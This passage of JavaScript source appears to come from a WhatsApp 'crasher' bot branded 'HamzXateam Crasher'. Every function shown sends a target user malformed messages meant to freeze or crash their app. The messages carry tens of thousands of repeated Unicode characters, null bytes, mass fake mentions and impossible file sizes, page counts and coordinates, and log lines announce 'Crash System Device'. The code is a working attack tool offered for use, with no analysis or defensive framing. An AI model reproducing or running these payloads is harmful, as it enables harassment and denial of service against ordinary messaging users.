           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: "",
          },
         },
        },
       },
      },
     },
    },
    Ptcp ? {
     participant: {
      jid: target
     }
    } : {}
   );
   console.log(chalk.green("Send Bug By 𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐂𝐫𝐚𝐬𝐡𝐞𝐫〽️"));
  };
async function TrashSystem(target, spider, Ptcp = true) {
   await hamz.relayMessage(target, {
     ephemeralMessage: {
      message: {
       interactiveMessage: {
        header: {
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
          fileName: "⿻⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝗜𝄽⃟⃟⃟🇮🇩🇮🇩⿻-𝐅𝐚‌𝐭‌𝐚𝐥‌𝐄‌𝐱𝐞𝐜‌𝐮‌𝐭𝐞 メ",
          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1726867151",
          contactVcard: true,
          jpegThumbnail: spider,
         },
         hasMediaAttachment: true,
        },
        body: {
         text: "𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐂𝐫𝐚𝐬𝐡𝐞𝐫\n" + "@6283129626211".repeat(17000),
        },
        contextInfo: {
         mentionedJid: ["6283129626211@s.whatsapp.net", ...Array.from({
          length: 30000
         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
         forwardingScore: 1,
         isForwarded: true,
         fromMe: false,
         participant: "0@s.whatsapp.net",
         remoteJid: "status@broadcast",
         quotedMessage: {
          documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐂𝐫𝐚𝐬𝐡𝐞𝐫〽️",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: spider,
          },
         },
        },
       },
      },
     },
    },
    Ptcp ? { participant: { jid: target } } : {}
    );
};
async function CrashUi(X, Qtd, ThM, cct = false, Ptcp = true) {
      let etc = generateWAMessageFromContent(
        X,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "",
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 9007199254740991,
                    mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                    fileName: "⿻⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝄽⃟⃟⃟🇮🇩🇮🇩⿻ ⿻",
                    fileEncSha256:
                      "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                    directPath:
                      "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1723855952",
                    contactVcard: true,
                    thumbnailDirectPath:
                      "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256:
                      "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256:
                      "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: ThM,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "⿻⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝄽⃟⃟⃟🇮🇩🇮🇩⿻ " + "ꦾ".repeat(70000),
                },
                nativeFlowMessage: {
                  messageParamsJson:
                    '{"name":"galaxy_message","title":"oi","header":" # trashdex - explanation ","body":"xxx"}',
                  buttons: [
                    cct
                      ? {
                          name: "single_select",
                          buttonParamsJson:
                            '{"title":"\n⿻⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝄽⃟⃟⃟🇮🇩🇮🇩⿻ \n\n' +
                            "᬴".repeat(0) +
                            '","sections":[{"title":"⿻⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝄽⃟⃟⃟🇮🇩🇮🇩⿻ ","rows":[]}]}',
                        }
                      : {
                          name: "payment_method",
                          buttonParamsJson: "",
                        },
                    {
                      name: "call_permission_request",
                      buttonParamsJson: "{}",
                    },
                    {
                      name: "payment_method",
                      buttonParamsJson: "{}",
                    },
                    {
                      name: "single_select",
                      buttonParamsJson:
                        '{"title":"⿻⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝄽⃟⃟⃟🇮🇩🇮🇩⿻ ","sections":[{"title":"⿻⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝄽⃟⃟⃟🇮🇩🇮🇩⿻  ϟ","rows":[]}]}',
                    },
                    {
                      name: "galaxy_message",
                      buttonParamsJson:
                        '{"flow_action":"navigate","flow_action_payload":{"screen":"WELCOME_SCREEN"},"flow_cta":"🔥","flow_id":"BY DEVORSIXCORE","flow_message_version":"9","flow_token":"MYPENISMYPENISMYPENIS"}',
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "{}",
                    },
                  ],
                },
              },
            },
          },
        }),
        {
          userJid: X,
          quoted: Qtd,
        }
      );

      await hamz.relayMessage(
        X,
        etc.message,
        Ptcp
          ? {
              participant: {
                jid: X,
              },
            }
          : {}
      );
      console.log(chalk.green("Sucess Send Bugs BY⿻ 𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐂𝐫𝐚𝐬𝐡𝐞𝐫⿻ ▾⭑"));
    }
async function DocSystem(target) {
let virtex = "⿻⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝄽⃟⃟⃟🇮🇩🇮🇩⿻ ";
            hamz.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "⿻⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝄽⃟⃟⃟🇮🇩🇮🇩⿻ " + "ꦾ".repeat(50000) + "@1".repeat(30)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "SkyzoXSENTRY" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };
        async function DocSystem2(target) {
            hamz.relayMessage(
                target,
                {
                    viewOnceMessage: {
                        message: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/pdf",
                                fileSha256: "cZMerKZPh6fg4lyBttYoehUH1L8sFUhbPFLJ5XgV69g=",
                                fileLength: "1991837291999",
                                pageCount: 199183729199991,
                                mediaKey: "eKiOcej1Be4JMjWvKXXsJq/mepEA0JSyE0O3HyvwnLM=",
                                fileName: "DeepDocumentDpr",
                                fileEncSha256: "6AdQdzdDBsRndPWKB5V5TX7TA5nnhJc7eD+zwVkoPkc=",
                                directPath: "/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1728631701",
                                contactVcard: true,
                                caption: " ꦾ".repeat(20) + "@1".repeat(50000),
                                contextInfo: {
                                    mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                    groupMentions: [{ groupJid: "1@newsletter", groupSubject: "hamz ⚔️" }],
                                    isForwarded: true,
                                    quotedMessage: {
                                        interactiveResponseMessage: {
                                            body: {
                                                text: "Sent",
                                                format: "DEFAULT"
                                            },
                                            nativeFlowResponseMessage: {
                                                name: "galaxy_message",
                                                paramsJson: `{
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "AVILIABLEBYBara",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "hamz@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(50000)}",
                "screen_0_TextInput_1": "Why?",
                "screen_0_Dropdown_2": "001-Grimgar",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                        }`,
                                                version: 3
                                            },
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                { participant: { jid: target } }
            );
        };
async function DocSystem3(target) {
            hamz.relayMessage(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: "XHIROXD",
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                title: "Tra͢sᯭh͢ Ui-Aviliable",
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "TypeTrashUi-Killer"
                            },
                            nativeFlowMessage: {
                                buttons: [
                                    {
                                        name: 'call_permission_request',
                                        buttonParamsJson: '{}'
                                    }
                                ]
                            },
                            contextInfo: {
                                quotedMessage: {
                                    interactiveResponseMessage: {
                                        body: {
                                            text: "Sent",
                                            format: "DEFAULT"
                                        },
                                        nativeFlowResponseMessage: {
                                            name: "galaxy_message",
                                            paramsJson: `{
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "BaraXS",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "hamz@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(50000)}",
                "screen_0_TextInput_1": "Why?",
                "screen_0_Dropdown_2": "001-Grimgar",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                }`,
                                            version: 3
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }, { participant: { jid: target } }, { messageId: null });
};
async function FrezeeMsg2(target) {
            let virtex = "⿻ᬃ⿻⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝄽⃟⃟⃟🇮🇩🇮🇩⿻ ⿻";
            let memekz = Date.now();

            await hamz.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                locationMessage: {
                                    degreesLatitude: -999.03499999999999,
                                    degreesLongitude: 999.03499999999999
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "⿻⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝄽⃟⃟⃟🇮🇩🇮🇩⿻ " + "ꦾ".repeat(50000) + "@1".repeat(30)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "SkyziEXECUTE" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };
        async function FrezeeMsg1(target) {
            let virtex = "⿻⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝄽⃟⃟⃟🇮🇩🇮🇩⿻ ";

            hamz.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "⿻⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝄽⃟⃟⃟🇮🇩🇮🇩⿻ " + "ꦾ".repeat(50000) + "@1".repeat(30)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "BaraEXECUTE" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        }
   
async function BlankInvite(LockJids, Ptcp = true) {
			var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						"newsletterAdminInviteMessage": {
							"newsletterJid": `${idsal}`,
							"newsletterName": "𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐂𝐫𝐚𝐬𝐡𝐞𝐫⃟⃟⃟😈" + "\u0000".repeat(50000),
							"jpegThumbnail": "",
							"caption": 'ꦾ'.repeat(30000),
							"inviteExpiration": Date.now() + 1600
						}
					}
				}
			}), {
				'userJid': LockJids
			});
			await hamz.relayMessage(LockJids, messageContent.message, {
				'participant': {
					'jid': LockJids
				},
				'messageId': messageContent.key.id
			});
		}
async function liveLokFreeze(X, Ptcp = true) {
        let xcl = "ꪶ𖣂ꫂ x𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐂𝐫𝐚𝐬𝐡𝐞𝐫⃟⃟⃟😈 厷"+"ꦾ".repeat(77777) + "@1".repeat(77777);
var etc = generateWAMessageFromContent(X, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": xcl,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     },
     body: {
     text: "virtex"
     },
     nativeFlowMessage: {},
     contextInfo: {
     mentionedJid: ["6283129626211@s.whatsapp.net"],
     groupMentions: [{ groupJid: `${idsal}`, groupSubject: xcl }]
     }
  }
}
}), { userJid: X, quoted: m })
await hamz.relayMessage(X, etc.message, { participant: { jid: X }, messageId: etc.key.id })
console.log(chalk.red.bold('Crash System Device By 𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐂𝐫𝐚𝐬𝐡𝐞𝐫⃟⃟⃟😈'))
}
  async function uidoc(X, Ptcp = true) {
    let uitext = "𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐂𝐫𝐚𝐬𝐡𝐞𝐫⃟⃟⃟😈𝘼𝙩𝙩𝙖𝙘𝙠 𝙐𝙞" + "ꦾ".repeat(50000);
    await hamz.relayMessage(X, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/19392659_857576149596887_4268823484878612019_n.enc?ccb=11-4&oh=01_Q5AaIOQvG2wK688SyUp4JFWqGXhBQT6m5vUcvS2aBi0CXMTv&oe=676AAEC6&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/pdf',
                            fileSha256: "NpR4V+tVc+N2p3zZgKO9Zzo/I7LrhNHlJxyDBxsYJLo=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "6l+ksifBQsLHuJJGUs5klIE98Bv7usMDwGm4JF2rziw=",
                            fileName: "unidentifiedMessageType",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/19392659_857576149596887_4268823484878612019_n.enc?ccb=11-4&oh=01_Q5AaIOQvG2wK688SyUp4JFWqGXhBQT6m5vUcvS2aBi0CXMTv&oe=676AAEC6&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: uitext
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " Xin x9 " }]
                    }
                }
            }
        }
    }, { participant: { jid: X } }, { messageId: null });
}
    
    // Freeze Speciality //
     async function locv1(X, Ptcp = true) {
   let mark = '0@s.whatsapp.net';
    await hamz.relayMessage(X, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐂𝐫𝐚𝐬𝐡𝐞𝐫⃟⃟⃟😈" + "ꦾ".repeat(1099)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: " xCeZeT " }]
                    }
                }
            }
        }
    }, { participant: { jid: X } }, { messageId: null });
}

async function docufreeze(X, Ptcp = true) {
    let uitext = ".⃟  𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐂𝐫𝐚𝐬𝐡𝐞𝐫⃟⃟⃟😈⃤ " + "ꦾ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵‫‪‫҈꙲".repeat(50000);
    await hamz.relayMessage(X, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30473509_1487882801880114_6053807656786168970_n.enc?ccb=11-4&oh=01_Q5AaIAjozZG-7ebt_0VTalQg3jMRpk7lgF-rRdrUZ3BblPGJ&oe=676B61B9&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
                            fileSha256: "dnFCD9DtW/8seNK1KK9RFO/qR7ODsmBI/fkfkybi55s=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "6l+ksifBQsLHuJJGUs5klIE98Bv7usMDwGm4JF2rziw=",
                            fileName: ".⃟  𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐂𝐫𝐚𝐬𝐡𝐞𝐫⃟⃟⃟😈⃤",
                            fileEncSha256: "0IrI30eGq8SQ0KSAmUWpPFCr9CIvoZRC/0PFbulTsFU=",
                            directPath: "/v/t62.7119-24/30473509_1487882801880114_6053807656786168970_n.enc?ccb=11-4&oh=01_Q5AaIAjozZG-7ebt_0VTalQg3jMRpk7lgF-rRdrUZ3BblPGJ&oe=676B61B9&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1732511963",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: uitext
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "footer" }]
                    }
                }
            }
        }
    }, { participant: { jid: X } }, { messageId: null });
}

async function docfreeze2(X, Ptcp = true) {
    let uitext = "𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 🇮🇩" +  "꧀󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲".repeat(50000);
    await hamz.relayMessage(X, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30509355_1747184032799742_6644078360623643154_n.enc?ccb=11-4&oh=01_Q5AaIPoclG-9z7kzCK-pmRgL9Ss5OAsStWN10HK02vW8OfFg&oe=676BC4FC&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
                            fileSha256: "7SXMgNYBO4tkPSk3W46FQ3hUcK6K6G3//TiB5/ibhwg=",
                            fileLength: "829710112",
                            pageCount: 0x9184e729fff,
                            mediaKey: "/gaasVF/Lt68CK4sy5DTRhJDQls+RwNDwU6yhGZjPCk=",
                            fileName: "@𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 𝐂𝐫𝐚𝐬𝐡𝐞𝐫💸",
                            fileEncSha256: "nRvyfj/ky0+6upJrQMnwtuXm6lye2RuavfYM+cVl0hU=",
                            directPath: "v/t62.7119-24/30509355_1747184032799742_6644078360623643154_n.enc?ccb=11-4&oh=01_Q5AaIPoclG-9z7kzCK-pmRgL9Ss5OAsStWN10HK02vW8OfFg&oe=676BC4FC&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1732537847",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: uitext
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "footer" }]
                    }
                }
            }
        }
    }, { participant: { jid: X } }, { messageId: null });
}

     async function XeonHard(X, Ptcp = true)
    {
          const gg = "ꦽ󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲".repeat(10200);
          const ggg = "ꦿꦾ󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲".repeat(10200);
          hamz.relayMessage(X, {
            viewOnceMessage: {
              message: {
                extendedTextMessage: {
